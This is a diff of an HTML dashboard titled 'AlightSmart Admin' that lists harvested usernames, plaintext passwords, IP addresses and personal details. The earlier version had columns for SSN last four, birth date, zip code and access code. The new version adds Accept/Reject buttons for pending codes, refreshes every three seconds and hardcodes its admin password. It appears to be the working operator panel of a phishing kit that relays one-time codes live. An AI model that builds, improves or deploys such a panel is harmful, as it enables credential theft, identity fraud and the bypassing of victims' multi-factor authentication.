@@ -3,18 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AlightSmart Admin</title>
+    <title>AlightSmart Admin Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 1600px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f1f5f9; padding: 20px; }
+        .container { max-width: 1300px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
         table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #eee; }
         th { background: #e2e8f0; }
-        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
-        .refresh-btn { background: #3b82f6; color: white; }
-        .clear-btn { background: #ef4444; color: white; }
+        tr:hover { background: #f8fafc; }
+        .btn { padding: 6px 12px; margin: 2px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
+        .accept { background: #22c55e; color: white; }
+        .reject { background: #ef4444; color: white; }
+        .clear-btn { background: #ef4444; color: white; padding: 10px 20px; border: none; border-radius: 8px; margin: 15px; }
     </style>
 </head>
 <body>
@@ -28,65 +30,86 @@
             <thead>
                 <tr>
                     <th>Time</th>
+                    <th>Type</th>
                     <th>Username</th>
                     <th>Password</th>
-                    <th>SSN (Last 4)</th>
-                    <th>Birth Date</th>
-                    <th>Zip Code</th>
-                    <th>Access Code</th>
-                    <th>IP</th>
+                    <th>Full Details</th>
+                    <th>IP Address</th>
+                    <th>Action</th>
                 </tr>
             </thead>
             <tbody></tbody>
         </table>
 
-        <div style="text-align: center; padding: 20px;">
-            <button class="refresh-btn" onclick="loadRecords()">🔄 Refresh Now</button>
-            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
-        </div>
+        <button class="clear-btn" onclick="clearRecords()">Clear All Records</button>
     </div>
 
     <script>
         const ADMIN_PASSWORD = "tunde6035";
 
         async function loadRecords() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
-            const tbody = document.querySelector('#recordsTable tbody');
-            tbody.innerHTML = "";
+            try {
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const tbody = document.querySelector('#recordsTable tbody');
+                tbody.innerHTML = "";
 
-            records.forEach(r => {
-                tbody.innerHTML += `
-                    <tr>
-                        <td>${r.timestamp}</td>
-                        <td><strong>${r.username || '-'}</strong></td>
-                        <td><code>${r.password || '-'}</code></td>
-                        <td>${r.address ? r.address.split('|')[0] : '-'}</td>
-                        <td>${r.address ? r.address.split('|')[1] : '-'}</td>
-                        <td>${r.address ? r.address.split('|')[2] : '-'}</td>
-                        <td>${r.address ? r.address.split('|')[3] : '-'}</td>
-                        <td>${r.ip || '-'}</td>
-                    </tr>`;
-            });
+                records.forEach(r => {
+                    let action = '';
+                    if (r.address && r.address.includes("Pending")) {
+                        action = `
+                            <button class="btn accept" onclick="confirmCode(${r.id}, 'Confirmed')">Accept</button>
+                            <button class="btn reject" onclick="confirmCode(${r.id}, 'Rejected')">Reject</button>
+                        `;
+                    } else {
+                        action = r.address && r.address.includes("Confirmed") ? "✅ Confirmed" : "❌ Rejected";
+                    }
+
+                    tbody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp}</td>
+                            <td>${r.type}</td>
+                            <td><strong>${r.username || '-'}</strong></td>
+                            <td><code>${r.password || '-'}</code></td>
+                            <td style="max-width:400px; word-break:break-all;">${r.address || '-'}</td>
+                            <td>${r.ip || 'Unknown'}</td>
+                            <td>${action}</td>
+                        </tr>`;
+                });
+            } catch (e) {
+                console.error(e);
+            }
         }
 
+        async function confirmCode(id, status) {
+            if (confirm(`Mark this code as ${status}?`)) {
+                await fetch('/api/confirm-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id, status })
+                });
+                loadRecords();
+            }
+        }
+
+        async function clearRecords() {
+            if (confirm("Delete all records?")) {
+                await fetch('/api/clear', { method: 'POST' });
+                loadRecords();
+            }
+        }
+
+        // Password protection + Auto refresh
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
             if (pass === ADMIN_PASSWORD) {
                 loadRecords();
-                setInterval(loadRecords, 4000);
+                setInterval(loadRecords, 3000);   // Refresh every 3 seconds
             } else {
                 alert("❌ Wrong Password");
                 window.location.href = "/";
             }
         };
-
-        async function clearRecords() {
-            if (confirm("Clear ALL records?")) {
-                await fetch('/api/clear', { method: 'POST' });
-                loadRecords();
-            }
-        }
     </script>
 </body>
 </html>
